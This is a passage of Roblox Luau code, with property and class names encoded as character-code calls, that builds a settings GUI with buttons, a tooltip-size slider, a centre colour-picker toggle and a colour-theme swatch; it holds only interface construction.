_llza[_sc(101,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(101,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(101,53)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(101,52)]);
_llza[_sc(101,53)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(101,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(101,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(101,53)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(101,53)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(101,53)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(101,53)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(101,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(101,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(101,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(101,53)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(101,54)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(101,53)]);
_llza[_sc(101,54)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(101,54)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(101,54)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(101,54)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(101,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(101,53)]);
_llza[_sc(101,55)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(101,55)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(101,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(101,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(101,55)][_sc(78,97,109,101)]=[[buttonFrame]];
_llza[_sc(101,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(101,56)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(101,55)]);
_llza[_sc(101,56)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(101,56)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(101,57)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(101,55)]);
_llza[_sc(101,57)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(101,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(101,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(101,57)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(101,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(101,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(101,97)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(101,57)]);
_llza[_sc(101,97)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(101,97)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(101,98)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(101,53)]);
_llza[_sc(101,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(101,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(101,98)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(101,98)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(101,98)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(101,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(101,98)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(101,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(101,98)][_sc(84,101,120,116)]=[[Reset to Default]];
_llza[_sc(101,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(101,98)][_sc(90,73,110,100,101,120)]=101;
_llza[_sc(101,98)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(101,99)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(101,98)]);
_llza[_sc(101,99)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(101,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(101,52)]);
_llza[_sc(101,100)][_sc(90,73,110,100,101,120)]=100;
_llza[_sc(101,100)][_sc(83,105,122,101)]=UDim2.new(0, 0, 1, 0);
_llza[_sc(101,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(101,100)][_sc(78,97,109,101)]=[[fillbar]];
_llza[_sc(101,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(101,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=0.95;
_llza[_sc(101,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(101,101)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(98,102)]);
_llza[_sc(101,101)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(101,101)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(101,101)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=4;
_llza[_sc(101,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(101,101)][_sc(78,97,109,101)]=[[tooltipsize]];
_llza[_sc(101,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(101,101)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(101,101)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.11875, 0);
_llza[_sc(101,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(101,102)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(101,101)]);
_llza[_sc(101,102)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(101,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(101,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(101,102)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(101,102)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(101,102)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(101,102)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(101,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(101,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(101,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(101,102)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(102,48)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(101,102)]);
_llza[_sc(102,48)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(102,48)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(102,48)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(102,48)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(102,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(101,102)]);
_llza[_sc(102,49)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(102,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(102,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(102,49)][_sc(78,97,109,101)]=[[sliderFrame]];
_llza[_sc(102,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(102,50)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(102,49)]);
_llza[_sc(102,50)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(102,50)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(102,51)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(102,49)]);
_llza[_sc(102,51)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(102,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(102,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(102,51)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(102,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(102,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(102,52)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(102,51)]);
_llza[_sc(102,52)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(102,52)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(102,53)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(102,49)]);
_llza[_sc(102,53)][_sc(90,73,110,100,101,120)]=5;
_llza[_sc(102,53)][_sc(83,105,122,101)]=UDim2.new(0.5, 0, 1, 0);
_llza[_sc(102,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(102,53)][_sc(78,97,109,101)]=[[fillbar]];
_llza[_sc(102,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(102,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(102,54)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(101,102)]);
_llza[_sc(102,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(102,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(102,54)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(102,54)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(102,54)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(102,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(102,54)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(102,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(102,54)][_sc(84,101,120,116)]=[[X/X]];
_llza[_sc(102,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(102,54)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(102,54)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(102,55)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(102,54)]);
_llza[_sc(102,55)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(102,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(98,102)]);
_llza[_sc(102,56)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(102,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(102,56)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=3;
_llza[_sc(102,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(102,56)][_sc(78,97,109,101)]=[[tooltipsizeLABEL]];
_llza[_sc(102,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(102,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(102,56)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.11875, 0);
_llza[_sc(102,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(102,57)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(102,56)]);
_llza[_sc(102,57)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(102,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(102,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(102,57)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(102,57)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(102,57)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(102,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(102,57)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(102,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(102,57)][_sc(84,101,120,116)]=[[Tooltip Size:]];
_llza[_sc(102,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(102,57)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(102,57)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(102,97)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(102,57)]);
_llza[_sc(102,97)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(102,98)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(102,57)]);
_llza[_sc(102,98)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(102,99)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(98,102)]);
_llza[_sc(102,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(102,99)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(102,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(102,99)][_sc(78,97,109,101)]=[[centercolorpicker]];
_llza[_sc(102,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(102,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(102,99)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(102,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(102,100)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(102,99)]);
_llza[_sc(102,100)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(102,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(102,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(102,100)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(102,100)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(102,100)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(102,100)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(102,100)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(102,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(102,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(102,100)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(102,101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(102,100)]);
_llza[_sc(102,101)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(102,101)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(102,101)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(102,101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(102,102)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(102,100)]);
_llza[_sc(102,102)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(102,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(102,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(102,102)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(102,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,48,48)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(102,102)]);
_llza[_sc(49,48,48)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,48,48)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,48,49)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(102,102)]);
_llza[_sc(49,48,49)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,48,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,48,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,48,49)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(49,48,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,48,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,48,50)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,48,49)]);
_llza[_sc(49,48,50)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,48,50)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,48,51)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(102,99)]);
_llza[_sc(49,48,51)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,48,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,48,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,48,51)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,48,51)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,48,51)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,48,51)][_sc(83,105,122,101)]=UDim2.new(0, 155, 0, 20);
_llza[_sc(49,48,51)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,48,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,48,51)][_sc(84,101,120,116)]=[[Center Color Picker]];
_llza[_sc(49,48,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,48,51)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,48,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,48,51)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(49,48,52)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,48,51)]);
_llza[_sc(49,48,52)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(49,48,53)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,48,51)]);
_llza[_sc(49,48,53)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,48,54)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(102,99)]);
_llza[_sc(49,48,54)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(49,48,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(98,102)]);
_llza[_sc(49,48,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(49,48,55)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(49,48,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,48,55)][_sc(78,97,109,101)]=[[guicolortheme]];
_llza[_sc(49,48,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,48,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,48,55)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,48,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,48,56)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,48,55)]);
_llza[_sc(49,48,56)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(49,48,57)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,48,55)]);
_llza[_sc(49,48,57)][_sc(90,73,110,100,101,120)]=40;
_llza[_sc(49,48,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,48,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,48,57)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,48,57)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,48,57)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,48,57)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,48,57)][_sc(83,105,122,101)]=UDim2.new(0, 40, 1, 0);
_llza[_sc(49,48,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,48,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,48,57)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -40, 0, 0);
_llza[_sc(49,48,57)][_sc(78,97,109,101)]=[[guicolortheme]];
_llza[_sc(49,48,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,48,57)]);
_llza[_sc(49,48,97)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(49,48,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,48,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,48,97)][_sc(78,97,109,101)]=[[colorFrame]];
_llza[_sc(49,48,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,48,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,48,98)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,48,97)]);
_llza[_sc(49,48,98)][_sc(67,111,108,111,114)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,48,98)][_sc(84,104,105,99,107,110,101,115,115)]=1.5;
_llza[_sc(49,48,98)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=0.5;
_llza[_sc(49,48,98)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(49,48,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,48,57)]);
_llza[_sc(49,48,99)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 4);
_llza[_sc(49,48,99)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 4);
_llza[_sc(49,48,99)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 5);
_llza[_sc(49,48,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(49,48,100)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,48,55)]);
_llza[_sc(49,48,100)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,48,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,48,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,48,100)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,48,100)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,48,100)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,48,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,48,100)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
